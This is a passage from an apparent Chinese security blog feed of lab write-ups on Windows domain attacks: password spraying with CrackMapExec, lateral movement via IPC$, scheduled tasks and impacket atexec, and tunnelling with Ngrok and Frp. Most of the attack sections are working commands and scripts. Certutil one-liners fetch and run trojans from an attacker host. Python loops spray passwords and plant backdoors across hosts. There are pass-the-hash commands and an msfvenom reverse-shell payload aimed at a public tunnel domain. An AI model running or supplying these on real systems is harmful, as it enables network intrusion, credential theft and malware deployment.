alt="image-20220929191046187"></p><p>密码喷射域登录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27;</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929191740434.png" alt="image-20220929191740434"></p><p>密码喷射本地登录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; --local-auth</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929191837593.png" alt="image-20220929191837593"></p><p>密码喷射本地登录命令执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; -x &#x27;whoami&#x27; --local-aut</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929192122760.png" alt="image-20220929192122760"><br>密码喷射本地登录命令执行上线：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; -x &#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/test.exe &amp; c:/test.exe&#x27; --local-auth</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929192238867.png" alt="image-20220929192238867"><br>成功上线两台主机</p><p>密码喷射域登录命令执行上线：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; -x &#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/test.exe &amp; c:/test.exe&#x27;</span><br></pre></td></tr></table></figure><p>密码喷射本地&amp;域登录命令执行全自动上线：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u user.txt -p pass.txt -x &#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/test.exe &amp; c:/test.exe&#x27;</span><br><span class="line"></span><br><span class="line">proxychains4 cme smb 192.168.3.21-32 -u Administrator -p Admin12345 -x &#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/test.exe &amp; c:/test.exe&#x27; --local-auth</span><br></pre></td></tr></table></figure><p>根据上线主机抓取密码然后写入字典进行测试<br><img src="/posts/82f7f61b/image-20220929212413728.png" alt="image-20220929212413728"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向移动(一)-IPC</title>
      <link href="/posts/2dc66d79/"/>
      <url>/posts/2dc66d79/</url>
      
        <content type="html"><![CDATA[<h1 id="内网横向移动-一-IPC"><a href="#内网横向移动-一-IPC" class="headerlink" title="内网横向移动(一)-IPC"></a>内网横向移动(一)-IPC</h1><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p><img src="/posts/2dc66d79/bfl2kYExirJ2o8jENtd6_g.png" alt="img"><br><img src="/posts/2dc66d79/image-20220927161548820.png" alt="image-20220927161548820"><br>只有webserver出网，我们已经拿到webserver的shell，尝试对其他内网主机进行横向移动</p><h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p>需要收集:目标 用户 凭据 网络<br>查看该主机是否为域环境 (cs命令行下需要在前面加shell)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p><img src="/posts/2dc66d79/image-20220927161913233.png" alt="image-20220927161913233"></p><p>获取域控ip地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping OWA2010CN-God.god.org</span><br></pre></td></tr></table></figure><p><img src="/posts/2dc66d79/image-20220927162118801.png" alt="image-20220927162118801"></p><p>可以看到192.168.3.21可能为域控<br>获取域内用户名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p><img src="/posts/2dc66d79/image-20220927162536034.png" alt="image-20220927162536034"></p><p>接下来用插件提权<br><img src="/posts/2dc66d79/image-20220927162851592.png" alt="image-20220927162851592"><br><img src="/posts/2dc66d79/image-20220927162903508.png" alt="image-20220927162903508"><br><img src="/posts/2dc66d79/image-20220927162939083.png" alt="image-20220927162939083"></p><p>接下来用插件进行端口扫描发现主机<br><img src="/posts/2dc66d79/image-20220927162719180.png" alt="image-20220927162719180"><br><img src="/posts/2dc66d79/image-20220927163242046.png" alt="image-20220927163242046"><br><img src="/posts/2dc66d79/image-20220927163735058.png" alt="image-20220927163735058"><br>获取明文密码<br><img src="/posts/2dc66d79/image-20220927164105343.png" alt="image-20220927164105343"><br>抓取hash<br><img src="/posts/2dc66d79/image-20220927164322560.png" alt="image-20220927164322560"><br><img src="/posts/2dc66d79/image-20220927164448467.png" alt="image-20220927164448467"></p><h2 id="域横向移动-IPC"><a href="#域横向移动-IPC" class="headerlink" title="域横向移动-IPC"></a>域横向移动-IPC</h2><h3 id="什么是ipc"><a href="#什么是ipc" class="headerlink" title="什么是ipc?"></a>什么是ipc?</h3><p>IPC是专用管道，可以实现对远程计算机的访问，<br>需要使用目标系统用户的账号密码，使用139、445端口。</p><p>利用步骤:</p><ol><li>建立IPC链接到目标主机</li><li>拷贝要执行的命令脚本到目标主机</li><li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</li><li>删除IPC链接</li></ol><p>命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net use \\server\ipc$ &quot;password&quot; /user:username # 工作组</span><br><span class="line">net use \\server\ipc$ &quot;password&quot; /user:domain\username #域内</span><br><span class="line">dir \\xx.xx.xx.xx\C$\        # 查看文件列表</span><br><span class="line">copy \\xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件</span><br><span class="line">copy 1.bat \\xx.xx.xx.xx\C$ # 复制文件</span><br><span class="line">net use \\xx.xx.xx.xx\C$\1.bat /del # 删除IPC</span><br><span class="line">net view xx.xx.xx.xx        # 查看对方共享</span><br></pre></td></tr></table></figure><p>建立IPC常见的错误代码<br>（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限<br>（2）51：网络问题，Windows 无法找到网络路径<br>（3）53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题<br>（4）67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$<br>（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立IPC$，需要先删除<br>（6）1326：账号密码错误<br>（7）1792：目标NetLogon服务未启动，连接域控常常会出现此情况<br>（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</p><p>建立IPC失败的可能原因<br>（1）目标系统不是NT或以上的操作系统<br>（2）对方没有打开IPC$共享<br>（3）对方未开启139、445端口，或者被防火墙屏蔽<br>（4）输出命令、账号密码有错误</p><h3 id="命令版-at-amp-schtasks"><a href="#命令版-at-amp-schtasks" class="headerlink" title="命令版-at&amp;schtasks"></a>命令版-at&amp;schtasks</h3><p>0、上线配置</p><p>上线其他主机有两种方式:<br>正向：建立正向木马由webserver这台主机去连接达到上线<br><img src="/posts/2dc66d79/image-20220927165732535.png" alt="image-20220927165732535"></p><p>反向：在webserver建立监听器其他主机反向连接到webserver达到转发上线<br>代理转发-&gt;转发上线-&gt;beacon.exe<br><img src="/posts/2dc66d79/image-20220927181726329.png" alt="image-20220927181726329"><br><img src="/posts/2dc66d79/image-20220927183757084.png" alt="image-20220927183757084"></p><p>在实战中如何将木马上传并且执行呢(以反向连接为例)<br>先将我们生成的木马上传到webserver主机<br><img src="/posts/2dc66d79/image-20220927183945820.png" alt="image-20220927183945820"><br><img src="/posts/2dc66d79/image-20220927184013184.png" alt="image-20220927184013184"></p><p>接下来就要用到IPC了</p><p>1、at</p><p>适用版本 &lt; Windows2012</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator #建立ipc连接：</span><br><span class="line">copy beacon.exe \\192.168.3.21\c$ #拷贝执行文件到目标机器</span><br><span class="line">at \\192.168.3.21 18:45 c:\beacon.exe  #添加计划任务</span><br></pre></td></tr></table></figure><p>2、schtasks<br>适用版本 &gt;&#x3D;Windows2012</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.32\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 建立ipc连接：</span><br><span class="line">copy zhufa.exe \\192.168.3.32\c$ #复制文件到其C盘</span><br><span class="line">schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn beacon /sc DAILY /tr c:\beacon.exe /F #创beacon任务对应执行文件</span><br><span class="line">schtasks /run /s 192.168.3.32 /tn beacon /i #运行beacon任务</span><br><span class="line">schtasks /delete /s 192.168.3.32 /tn beacon /f #删除beacon任务</span><br></pre></td></tr></table></figure><h3 id="插件版-CS-amp-LSTARS"><a href="#插件版-CS-amp-LSTARS" class="headerlink" title="插件版-CS&amp;LSTARS"></a>插件版-CS&amp;LSTARS</h3><p>LSTARS-横向移动-IPC连接<br><img src="/posts/2dc66d79/image-20220927191420684.png" alt="image-20220927191420684"><br><img src="/posts/2dc66d79/image-20220927191642464.png" alt="image-20220927191642464"><br><img src="/posts/2dc66d79/image-20220927191652170.png" alt="image-20220927191652170"></p><h3 id="套件版-Impacket-atexec"><a href="#套件版-Impacket-atexec" class="headerlink" title="套件版-Impacket-atexec"></a>套件版-Impacket-atexec</h3><p>impacket-atexec<br>该工具是一个半交互的工具，适用于Webshell下，Socks代理下;<br>在渗透利用中可以收集用户名、明文密码、密码hash、远程主机等做成字典，批量测试</p><p>1、Py版：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a><br>利用ipc执行命令并回显</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python atexec.py god/administrator:Admin12345@192.168.3.21 &quot;ver&quot;</span><br><span class="line">python atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p>将木马放到webserver的web站点然后利用命令让其他主机下载木马并执行<br><img src="/posts/2dc66d79/image-20220927213624492.png" alt="image-20220927213624492"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python atexec.py god/administrator:Admin12345@192.168.3.21 &quot;certutil.exe -urlcache -split -f http://192.168.3.31:80/zhufa.exe test.exe&quot;</span><br></pre></td></tr></table></figure><p>2、Exe版：<a href="https://gitee.com/RichChigga/impacket-examples-windows">https://gitee.com/RichChigga/impacket-examples-windows</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">CS本地用户明文连接：</span></span><br><span class="line">shell atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">CS域内用户明文连接：</span></span><br><span class="line">shell atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;ver&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">CS域内本地用户明文密文连接：</span></span><br><span class="line">shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</span><br><span class="line">shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure><h3 id="代理版-Socks-amp-Py-amp-atexec"><a href="#代理版-Socks-amp-Py-amp-atexec" class="headerlink" title="代理版-Socks&amp;Py&amp;atexec"></a>代理版-Socks&amp;Py&amp;atexec</h3><p>攻击全由本机发出通过socks代理向内网通讯</p><p>1、建立SOCK节点并连接<br><img src="/posts/2dc66d79/image-20220927195928499.png" alt="image-20220927195928499"><br>用Proxifier配置代理<br><img src="/posts/2dc66d79/image-20220927200528255.png" alt="image-20220927200528255"><br><img src="/posts/2dc66d79/image-20220927200548849.png" alt="image-20220927200548849"><br><img src="/posts/2dc66d79/image-20220927200907617.png" alt="image-20220927200907617"></p><p>2、自写脚本批量下载上线</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.32&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users=&#123;</span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;itadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vpnadm&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">passs=&#123;</span><br><span class="line">    <span class="string">&#x27;admin!@#45&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#下载后门</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xz</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">for</span> mima <span class="keyword">in</span> passs:</span><br><span class="line">                exec1=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py ./administrator:&#x27;</span>+mima+<span class="string">&#x27;@&#x27;</span>+ip+<span class="string">&#x27; &quot;certutil -urlcache -split -f http://192.168.3.31/zhufa.exe c:/test.exe&quot;&#x27;</span></span><br><span class="line">                exec2=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py god/&#x27;</span>+user+<span class="string">&#x27;:&#x27;</span>+mima+<span class="string">&#x27;@&#x27;</span>+ip+<span class="string">&#x27; &quot;certutil -urlcache -split -f http://192.168.3.31/zhufa.exe c:/test.exe&quot;&#x27;</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span>+exec1+<span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec2 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                os.system(exec1)</span><br><span class="line">                os.system(exec2)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    xz()</span><br></pre></td></tr></table></figure><p>192.168.3.32，192.168.3.29下载成功<br><img src="/posts/2dc66d79/image-20220928110301622.png" alt="image-20220928110301622"><br><img src="/posts/2dc66d79/image-20220928110338368.png" alt="image-20220928110338368"></p><p>执行木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">ips = [<span class="string">&#x27;192.168.3.29&#x27;</span>, <span class="string">&#x27;192.168.3.32&#x27;</span>]</span><br><span class="line">passs = [<span class="string">&#x27;admin!@#45&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">for</span> pwd <span class="keyword">in</span> passs:</span><br><span class="line">            cmd = <span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py god/administrator:&#x27;</span> + pwd + <span class="string">&#x27;@&#x27;</span> + ip + <span class="string">&#x27; &quot;zx.exe&quot;&#x27;</span></span><br><span class="line">            cmd1 = <span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py ./administrator:&#x27;</span> + pwd + <span class="string">&#x27;@&#x27;</span> + ip + <span class="string">&#x27; &quot;zx.exe&quot;&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(cmd)</span><br><span class="line">            os.system(cmd)</span><br><span class="line">            os.system(cmd1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    zx()</span><br></pre></td></tr></table></figure><p><img src="/posts/2dc66d79/image-20220928112057717.png" alt="image-20220928112057717"><br>成功上线两台主机</p><p>3、继续收集凭据横向移动<br>利用刚刚上线的主机获取密码和hash继续横向移动，改下脚本<br><img src="/posts/2dc66d79/image-20220928120147723.png" alt="image-20220928120147723"></p><p>下载木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">users=&#123;</span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#下载后门</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xz</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">for</span> mima <span class="keyword">in</span> passs:</span><br><span class="line">                exec1=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@&#x27;</span>+ip+<span class="string">&#x27;&quot;certutil -urlcache -split -f http://192.168.3.31/zhufa.exe test.exe&quot;&#x27;</span></span><br><span class="line">                exec2=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@&#x27;</span>+ip+<span class="string">&#x27; &quot;certutil -urlcache -split -f http://192.168.3.31/zhufa.exe test.exe&quot;&#x27;</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span>+exec1+<span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec2 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                os.system(exec1)</span><br><span class="line">                os.system(exec2)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    xz()</span><br></pre></td></tr></table></figure><p><img src="/posts/2dc66d79/image-20220928121619404.png" alt="image-20220928121619404"></p><p><img src="/posts/2dc66d79/image-20220928121644442.png" alt="image-20220928121644442"></p><p>执行木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">ips = [<span class="string">&#x27;192.168.3.21&#x27;</span>, <span class="string">&#x27;192.168.3.25&#x27;</span>, <span class="string">&#x27;192.168.3.30&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        cmd = <span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@&#x27;</span> + ip + <span class="string">&#x27; &quot;test.exe&quot;&#x27;</span></span><br><span class="line">        cmd1 = <span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@&#x27;</span> + ip + <span class="string">&#x27; &quot;test.exe&quot;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(cmd)</span><br><span class="line">        os.system(cmd)</span><br><span class="line">        os.system(cmd1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    zx()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/posts/2dc66d79/image-20220928122959205.png" alt="image-20220928122959205"><br>再次抓明文密码<br><img src="/posts/2dc66d79/image-20220928123258847.png" alt="image-20220928123258847"><br>成功拿到域控密码</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网穿透上线</title>
      <link href="/posts/84ae0305/"/>
      <url>/posts/84ae0305/</url>
      
        <content type="html"><![CDATA[<h1 id="内网穿透上线"><a href="#内网穿透上线" class="headerlink" title="内网穿透上线"></a>内网穿透上线</h1><p>一个内网中的主机想要控制另一个内网中的主机因为无法直接通讯,所以要用到内网穿透<br><img src="/posts/84ae0305/image-20220924084714528.png" alt="image-20220924084714528"><br>内网穿透简单理解也就是创建一个外网服务器,将我们的端口映射到外网服务器中，当肉鸡流量达到外网服务器后外网服务器把流量转给我们的攻击机</p><p>旨在代理连接肉鸡后实现本地渗透肉鸡网络架构</p><p>Linux：Proxychains<br>Windows：Sockscap Proxifier<br>穿透项目：Ngrok Frp Spp Nps EW(停更)<br>优点：穿透加密数据，中间平台，防追踪，解决网络问题</p><h2 id="Ngrok"><a href="#Ngrok" class="headerlink" title="Ngrok"></a>Ngrok</h2><p><a href="https://www.ngrok.cc/">https://www.ngrok.cc/</a><br>支持的协议：tcp、http、https<br>支持的类型：正向代理、反向代理<br><img src="/posts/84ae0305/image-20220924090917778.png" alt="image-20220924090917778"><br>使用免费的服务器就行</p><p>1、服务端配置：</p><p>开通隧道-TCP协议-指向IP和端口-开通隧道-连接隧道<br><img src="/posts/84ae0305/image-20220924091746949.png" alt="image-20220924091746949"><br>红框位置处为攻击机地址<br><img src="/posts/84ae0305/image-20220924092130441.png" alt="image-20220924092130441"></p><p>2、客户端连接服务端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sunny clientid [隧道id] #控制端连接Ngrok的服务器</span><br></pre></td></tr></table></figure><p><img src="/posts/84ae0305/image-20220924092408911.png" alt="image-20220924092408911"><br><img src="/posts/84ae0305/image-20220924092440755.png" alt="image-20220924092440755"><br>成功连接</p><p>3、客户端生成后门配置监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">lhost为赠送域名 lport为刚才设置的端口</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=free.idcfengye.com lport=10239 -f exe -o tcp.exe </span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 2222</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/84ae0305/image-20220924093357416.png" alt="image-20220924093357416"></p><h2 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h2><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>frp是一个专注于内网穿透的高性能的反向代理应用，支持TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网IP节点的中转暴露到公网。<br>自行搭建，方便修改，成本低，使用多样化，适合对隐私有要求的用户</p><p>1.服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）</p><p>服务器修改配置文件frps.ini：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p>启动服务端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><p><img src="/posts/84ae0305/image-20220924094839524.png" alt="image-20220924094839524"></p><p>2.控制端-下载-解压-修改-启动</p><p>控制端修改配置文件frpc.ini：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 101.35.21.250</span><br><span class="line">server_port = 7000        #frpc工作端口，必须和上面frps保持一致</span><br><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 5555          #转发给本机的5555</span><br><span class="line">remote_port = 6000         #服务端用6000端口转发给本机</span><br></pre></td></tr></table></figure><p>以上配置文件的意思为:建立一个服务器开放一个7000端口用来建立Frp服务用来客户端来建立连接，开通6000端口来接受靶机流量转发给本地的5555端口</p><p>启动客户端：</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure><p><img src="/posts/84ae0305/image-20220924094911378.png" alt="image-20220924094911378"><br><img src="/posts/84ae0305/image-20220924094925290.png" alt="image-20220924094925290"><br>成功建立连接<br>生成木马</p><figure class="highlight 